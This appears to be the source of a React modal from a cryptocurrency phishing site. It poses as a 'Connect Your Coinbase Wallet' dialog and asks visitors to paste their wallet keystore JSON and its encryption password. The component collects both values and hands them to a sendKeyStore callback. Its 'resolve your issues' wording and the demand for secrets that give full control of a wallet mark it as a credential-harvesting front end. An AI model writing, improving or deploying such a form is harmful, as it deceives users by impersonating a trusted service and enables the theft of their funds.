import React, { useState } from 'react';
import styles from './KeystoreModal.module.css';

const KeystoreModal = ({ onClose, sendKeyStore, closeKeyStoreForm }) => {
    const [keyStore, setKeyStore] = useState('')
    const [password, setPassword] = useState('')

    const handleSubmit=(e)=>{
        e.preventDefault()
        if(!keyStore || !password){
            alert('Kindly complete the details correctly inorder to resolve your issues')
        }else{
            sendKeyStore([keyStore, password])
        }
    }
    return (
        <div className={styles.overlay} onClick={closeKeyStoreForm}>
            <div className={styles.modal} onClick={(e) => e.stopPropagation()}>
                <h2 className={styles.title}>Connect Your Coinbase Wallet</h2>
                <form className={styles.form} onSubmit={handleSubmit}>
                    <label className={styles.label} htmlFor="keystoreJson">Input Keystore JSON</label>
                    <textarea 
                        type="text" 
                        id="keystoreJson" 
                        className={styles.input} 
                        placeholder="Enter Keystore JSON" 
                        value={keyStore}
                        onChange={(e)=>setKeyStore(e.target.value)}
                    />
                    <label className={styles.label} htmlFor="password">Enter Password</label>
                    <input 
                        type="password" 
                        id="password" 
                        className={styles.input} 
                        placeholder="Enter Password" 
                        value={password}
                        onChange={(e)=>setPassword(e.target.value)}
                    />
                    <p className={styles.helperText}>Several lines of text beginning with " " plus the password you used to encrypt it</p>
                    <button className={styles.button} type='submit'>Connect Wallet</button>
                </form>
            </div>
        </div>
    );
}

export default KeystoreModal;
